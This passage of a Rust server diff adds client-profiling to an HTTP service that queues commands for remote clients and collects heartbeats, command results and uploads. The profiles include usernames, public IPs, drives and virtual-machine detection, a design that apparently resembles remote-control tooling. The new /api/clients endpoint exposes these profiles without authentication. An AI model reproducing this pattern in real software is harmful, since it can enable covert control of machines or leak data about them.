-                println!("  → Command response received: {} (success: {}) - {}", command_id, success, message);
-                
-                if let Some(obj) = data.as_object_mut() {
-                    obj.insert("received_at".into(), Value::String(Utc::now().to_rfc3339()));
-                    obj.insert("server_timestamp".into(), Value::from(unix_time()));
+            if !is_authorized(&req) {
+                return Ok(unauthorized());
+            }
+            match extract_json_body(req).await {
+                Ok(mut data) => {
+                    // ログ表示
+                    let command_id = data.get("command_id").and_then(|v| v.as_str()).unwrap_or("unknown");
+                    let success = data.get("success").and_then(|v| v.as_bool()).unwrap_or(false);
+                    let message = data.get("message").and_then(|v| v.as_str()).unwrap_or("no message");
+                    println!("  → Command response received: {} (success: {}) - {}", command_id, success, message);
+
+                    // タイムスタンプ付与し、レスポンスログへ保存
+                    if let Some(obj) = data.as_object_mut() {
+                        obj.insert("received_at".into(), Value::String(Utc::now().to_rfc3339()));
+                        obj.insert("server_timestamp".into(), Value::from(unix_time()));
+                    }
+                    state.response_log.lock().await.push(data.clone());
+
+                    // システム情報が含まれていればクライアント情報を更新
+                    if let (Some(client_id), Some(resp_data)) = (
+                        data.get("client_id").and_then(|v| v.as_str()),
+                        data.get("data"),
+                    ) {
+                        if let Some(sys) = resp_data.as_object() {
+                            if sys.get("hostname").is_some() && sys.get("os_name").is_some() {
+                                let mut clients = state.client_info.lock().await;
+                                let drives = sys
+                                    .get("disk_info")
+                                    .and_then(|v| v.as_array())
+                                    .map(|arr| {
+                                        arr.iter()
+                                            .filter_map(|drive| {
+                                                Some(DriveInfo {
+                                                    drive_letter: drive.get("drive_letter")?.as_str()?.to_string(),
+                                                    drive_type: "Fixed".to_string(),
+                                                    total_space_gb: drive.get("total_size_gb")?.as_f64()?,
+                                                    free_space_gb: drive.get("free_space_gb")?.as_f64()?,
+                                                    file_system: drive.get("file_system")?.as_str()?.to_string(),
+                                                })
+                                            })
+                                            .collect::<Vec<_>>()
+                                    })
+                                    .unwrap_or_default();
+
+                                let client_info = ClientInfo {
+                                    client_id: client_id.to_string(),
+                                    hostname: sys.get("hostname").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
+                                    username: sys.get("username").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
+                                    os_name: sys.get("os_name").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
+                                    os_version: sys.get("os_version").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
+                                    architecture: sys.get("os_arch").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
+                                    cpu_info: sys.get("cpu_info").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
+                                    timezone: sys.get("timezone").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
+                                    is_virtual_machine: sys.get("is_virtual_machine").and_then(|v| v.as_bool()).unwrap_or(false),
+                                    virtual_machine_vendor: sys.get("virtual_machine_vendor").and_then(|v| v.as_str()).map(|s| s.to_string()),
+                                    drives,
+                                    last_seen: unix_time(),
+                                    status: "updated".to_string(),
+                                    public_ip: sys.get("public_ip").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
+                                };
+                                clients.insert(client_id.to_string(), client_info);
+                            }
+                        }
+                    }
+
+                    Ok(json_response(json!({"status":"received"}), StatusCode::OK))
                 }
-                data
-            }, "received").await
+                Err(_) => Ok(json_response(json!({"error": "No JSON data provided"}), StatusCode::BAD_REQUEST)),
+            }
         }
 
         (Method::POST, "/api/heartbeat") => {
-            if !is_authorized(&req) { return Ok(unauthorized()); }
-            handle_client_json_request(&state, req, |data| {
-                let client_id = data.get("client_id").and_then(|v| v.as_str()).unwrap_or("unknown");
-                let hostname = data.get("hostname").and_then(|v| v.as_str()).unwrap_or("unknown");
-                let status = data.get("status").and_then(|v| v.as_str()).unwrap_or("unknown");
-                
-                tokio::spawn({
-                    let state = state.clone();
-                    let data = data.clone();
-                    let client_id = client_id.to_string();
-                    let hostname = hostname.to_string();
-                    let status = status.to_string();
-                    async move {
-                        log_activity(&state, "HEARTBEAT", &format!("Client {}@{} status: {}", client_id, hostname, status), Some(&client_id), None, Some(data)).await;
-                    }
-                });
-                
-                println!("  → Heartbeat from {}@{}: {}", client_id, hostname, status);
-                data
-            }, "received").await
+            if !is_authorized(&req) {
+                return Ok(unauthorized());
+            }
+            handle_client_json_request(
+                &state,
+                req,
+                |data| {
+                    let client_id = data
+                        .get("client_id")
+                        .and_then(|v| v.as_str())
+                        .unwrap_or("unknown");
+                    let hostname = data
+                        .get("hostname")
+                        .and_then(|v| v.as_str())
+                        .unwrap_or("unknown");
+                    let status = data
+                        .get("status")
+                        .and_then(|v| v.as_str())
+                        .unwrap_or("unknown");
+
+                    tokio::spawn({
+                        let state = state.clone();
+                        let data = data.clone();
+                        let client_id = client_id.to_string();
+                        let hostname = hostname.to_string();
+                        let status = status.to_string();
+                        async move {
+                            // デバッグ: 受信したデータをログに出力
+                            println!("🔍 Heartbeat received from {}: {}", client_id, serde_json::to_string_pretty(&data).unwrap_or_else(|_| "invalid json".to_string()));
+                            
+                            // クライアント情報の更新（システム情報がない場合でも基本情報は保存）
+                            let mut clients = state.client_info.lock().await;
+                            
+                            if let Some(system_info) = data.get("system_info").and_then(|v| if v.is_null() { None } else { Some(v) }) {
+                                println!("✅ System info found in heartbeat from {}", client_id);
+                                let client_info = ClientInfo {
+                                    client_id: client_id.clone(),
+                                    hostname: hostname.clone(),
+                                    username: system_info.get("username").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
+                                    os_name: system_info.get("os_name").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
+                                    os_version: system_info.get("os_version").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
+                                    architecture: system_info.get("os_arch").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
+                                    cpu_info: system_info.get("cpu_info").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
+                                    timezone: system_info.get("timezone").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
+                                    is_virtual_machine: system_info.get("is_virtual_machine").and_then(|v| v.as_bool()).unwrap_or(false),
+                                    virtual_machine_vendor: system_info.get("virtual_machine_vendor").and_then(|v| v.as_str()).map(|s| s.to_string()),
+                                    drives: system_info.get("disk_info").and_then(|v| v.as_array()).map(|drives| {
+                                        drives.iter().filter_map(|drive| {
+                                            Some(DriveInfo {
+                                                drive_letter: drive.get("drive_letter")?.as_str()?.to_string(),
+                                                drive_type: "Fixed".to_string(), // システム情報にはdrive_typeがないのでデフォルト値
+                                                total_space_gb: drive.get("total_size_gb")?.as_f64()?, // total_size_gb が正しいフィールド名
+                                                free_space_gb: drive.get("free_space_gb")?.as_f64()?,
+                                                file_system: drive.get("file_system")?.as_str()?.to_string(),
+                                            })
+                                        }).collect()
+                                    }).unwrap_or_default(),
+                                    last_seen: unix_time(),
+                                    status: status.clone(),
+                                    public_ip: system_info.get("public_ip").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
+                                };
+                                
+                                clients.insert(client_id.clone(), client_info);
+                            } else {
+                                println!("⚠️  No system_info in heartbeat from {}", client_id);
+                                
+                                // システム情報がない場合でも基本情報は保存（既存の情報を更新）
+                                if let Some(existing_client) = clients.get_mut(&client_id) {
+                                    // 既存クライアントの場合は基本情報のみ更新
+                                    existing_client.hostname = hostname.clone();
+                                    existing_client.last_seen = unix_time();
+                                    existing_client.status = status.clone();
+                                    println!("🔄 Updated basic info for existing client {}", client_id);
+                                } else {
+                                    // 新規クライアントの場合は未知の情報でエントリを作成
+                                    let client_info = ClientInfo {
+                                        client_id: client_id.clone(),
+                                        hostname: hostname.clone(),
+                                        username: "unknown".to_string(),
+                                        os_name: "unknown".to_string(),
+                                        os_version: "unknown".to_string(),
+                                        architecture: "unknown".to_string(),
+                                        cpu_info: "unknown".to_string(),
+                                        timezone: "unknown".to_string(),
+                                        is_virtual_machine: false,
+                                        virtual_machine_vendor: None,
+                                        drives: vec![],
+                                        last_seen: unix_time(),
+                                        status: status.clone(),
+                                        public_ip: "unknown".to_string(),
+                                    };
+                                    
+                                    clients.insert(client_id.clone(), client_info);
+                                    println!("🆕 Created new client entry without system info: {}", client_id);
+                                }
+                            }
+                            
+                            drop(clients); // ロックを明示的に解放
+
+                            log_activity(
+                                &state,
+                                "HEARTBEAT",
+                                &format!("Client {}@{} status: {}", client_id, hostname, status),
+                                Some(&client_id),
+                                None,
+                                Some(data),
+                            )
+                            .await;
+                        }
+                    });
+
+                    println!("  → Heartbeat from {}@{}: {}", client_id, hostname, status);
+                    data
+                },
+                "received",
+            )
+            .await
         }
 
         (Method::POST, "/api/data/upload") => {
-            if !is_authorized(&req) { return Ok(unauthorized()); }
-            handle_client_json_request(&state, req, |data| {
-                let client_id = data.get("client_id").and_then(|v| v.as_str()).unwrap_or("unknown");
-                let data_type = data.get("data_type").and_then(|v| v.as_str()).unwrap_or("unknown");
-                let filename = format!("uploaded_data_{}_{}.json", client_id, unix_time());
-                
-                if let Err(e) = std::fs::write(&filename, serde_json::to_string_pretty(&data).unwrap_or_else(|_| "{}".to_string())) {
-                    eprintln!("Failed to save {}: {}", filename, e);
-                } else {
-                    println!("  → Data upload from {}: {} saved to {}", client_id, data_type, filename);
-                }
-                data
-            }, "uploaded").await
+            if !is_authorized(&req) {
+                return Ok(unauthorized());
+            }
+            handle_client_json_request(
+                &state,
+                req,
+                |data| {
+                    let client_id = data
+                        .get("client_id")
+                        .and_then(|v| v.as_str())
+                        .unwrap_or("unknown");
+                    let data_type = data
+                        .get("data_type")
+                        .and_then(|v| v.as_str())
+                        .unwrap_or("unknown");
+                    // データ保存処理を削除（アップロードは受信のみ）
+                    println!(
+                        "  → Data upload received from {}: {} (not saved)",
+                        client_id, data_type
+                    );
+                    data
+                },
+                "uploaded",
+            )
+            .await
+        }
+
+        // クライアント情報取得エンドポイント
+        (Method::GET, "/api/clients") => {
+            let clients = state.client_info.lock().await;
+            let client_list: Vec<&ClientInfo> = clients.values().collect();
+            Ok(json_response(json!({"clients": client_list}), StatusCode::OK))
         }
 
         (Method::GET, "/api/status") => {
@@ -1299,11 +1924,13 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
         // Diagnostics endpoints (authorized) ----------------
         #[cfg(feature = "server_diagnostics")]
         (Method::GET, "/api/health") => {
-            if !is_authorized(&req) { return Ok(unauthorized()); }
+            if !is_authorized(&req) {
+                return Ok(unauthorized());
+            }
             let q = state.command_queue.lock().await;
             let r = state.response_log.lock().await;
             let now = unix_time();
-            let uptime = now.saturating_sub(state.server_start);
+            let uptime = now.saturating_sub(state._server_start);
             let body = json!({
                 "status": "ok",
                 "server_time": now,
@@ -1316,36 +1943,46 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
 
         #[cfg(feature = "server_diagnostics")]
         (Method::GET, "/api/network") => {
-            if !is_authorized(&req) { return Ok(unauthorized()); }
+            if !is_authorized(&req) {
+                return Ok(unauthorized());
+            }
             let lines = collect_network_diagnostics();
             let limited: Vec<String> = lines.into_iter().take(500).collect();
             Ok(json_response(json!({"lines": limited}), StatusCode::OK))
         }
 
-        #[cfg(feature = "server_diagnostics")]
+        #[cfg(all(feature = "server_diagnostics", windows))]
         (Method::GET, "/api/sysinfo") => {
-            if !is_authorized(&req) { return Ok(unauthorized()); }
+            if !is_authorized(&req) {
+                return Ok(unauthorized());
+            }
             match get_system_info() {
-                Ok(info) => Ok(json_response(serde_json::to_value(info).unwrap_or_else(|_| json!({"error":"serialize"})), StatusCode::OK)),
-                Err(e) => Ok(json_response(json!({"error": format!("{}", e)}), StatusCode::INTERNAL_SERVER_ERROR))
+                Ok(info) => Ok(json_response(
+                    serde_json::to_value(info).unwrap_or_else(|_| json!({"error":"serialize"})),
+                    StatusCode::OK,
+                )),
+                Err(e) => Ok(json_response(
+                    json!({"error": format!("{}", e)}),
+                    StatusCode::INTERNAL_SERVER_ERROR,
+                )),
             }
         }
 
         (Method::GET, "/api/logs") => {
             let limit = parse_query_u64(&req, "limit", 50);
             let offset = parse_query_u64(&req, "offset", 0);
-            
+
             let logs = state.activity_log.lock().await;
             let total = logs.len();
             let start = offset.min(total as u64) as usize;
             let end = (start + limit as usize).min(total);
-            
+
             let logs_slice: Vec<LogEntry> = if start < total {
                 logs[start..end].iter().rev().cloned().collect() // 新しいものから表示
             } else {
                 Vec::new()
             };
-            
+
             let response = serde_json::json!({
                 "logs": logs_slice,
                 "total": total,
@@ -1353,7 +1990,7 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
                 "limit": limit,
                 "has_more": end < total
             });
-            
+
             Ok(json_response(response, StatusCode::OK))
         }
 
@@ -1361,38 +1998,92 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
             let mut logs = state.activity_log.lock().await;
             let cleared_count = logs.len();
             logs.clear();
-            log_activity(&state, "INFO", &format!("Activity log cleared ({} entries)", cleared_count), None, None, None).await;
-            Ok(json_response(json!({"cleared": cleared_count, "status": "success"}), StatusCode::OK))
+            log_activity(
+                &state,
+                "INFO",
+                &format!("Activity log cleared ({} entries)", cleared_count),
+                None,
+                None,
+                None,
+            )
+            .await;
+            Ok(json_response(
+                json!({"cleared": cleared_count, "status": "success"}),
+                StatusCode::OK,
+            ))
         }
-
-
 
         (Method::GET, "/api/responses") => {
             let limit = parse_query_u64(&req, "limit", 10);
             let command_id = parse_query_param(&req, "command_id");
-            
+
             let responses = state.response_log.lock().await;
             let filtered_responses: Vec<&Value> = if let Some(cmd_id) = command_id {
-                responses.iter()
+                responses
+                    .iter()
                     .filter(|r| r.get("command_id").and_then(|id| id.as_str()) == Some(&cmd_id))
                     .take(limit as usize)
                     .collect()
             } else {
-                responses.iter()
-                    .rev()
-                    .take(limit as usize)
-                    .collect()
+                responses.iter().rev().take(limit as usize).collect()
             };
-            
+
             let response = serde_json::json!({
                 "responses": filtered_responses,
                 "total": responses.len()
             });
-            
+
             Ok(json_response(response, StatusCode::OK))
         }
 
-        _ => Ok(json_response(json!({"error":"Not Found"}), StatusCode::NOT_FOUND)),
+        // システム情報更新エンドポイント
+        (Method::POST, "/api/clients/update-sysinfo") => {
+            if !is_authorized(&req) {
+                return Ok(unauthorized());
+            }
+            let client_id = parse_query_param(&req, "client_id");
+            if client_id.is_none() {
+                return Ok(json_response(
+                    json!({"error": "client_id parameter is required"}),
+                    StatusCode::BAD_REQUEST,
+                ));
+            }
+            let client_id = client_id.unwrap();
+
+            // コマンドキューにシステム情報更新コマンドを追加
+            let command_id = format!("cmd_{}", unix_time());
+            let command = Command {
+                id: command_id.clone(),
+                command_type: "update_system_info".to_string(),
+                parameters: vec![],
+                timestamp: unix_time(),
+                auth_token: AUTH_TOKEN.to_string(),
+            };
+
+            state.command_queue.lock().await.push(command.clone());
+            state.activity_log.lock().await.push(LogEntry {
+                timestamp: unix_time(),
+                level: "INFO".to_string(),
+                message: "System info update requested".to_string(),
+                client_id: Some(client_id.clone()),
+                command_id: Some(command_id.clone()),
+                details: None,
+            });
+
+            Ok(json_response(
+                json!({
+                    "status": "System info update requested",
+                    "command_id": command_id,
+                    "client_id": client_id
+                }),
+                StatusCode::OK,
+            ))
+        }
+
+        _ => Ok(json_response(
+            json!({"error":"Not Found"}),
+            StatusCode::NOT_FOUND,
+        )),
     }
 }
 
@@ -1402,6 +2093,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
         command_queue: Mutex::new(Vec::new()),
         response_log: Mutex::new(Vec::new()),
         activity_log: Mutex::new(Vec::new()),
+        client_info: Mutex::new(HashMap::new()),
         notify: Notify::new(),
         _server_start: unix_time(),
     });
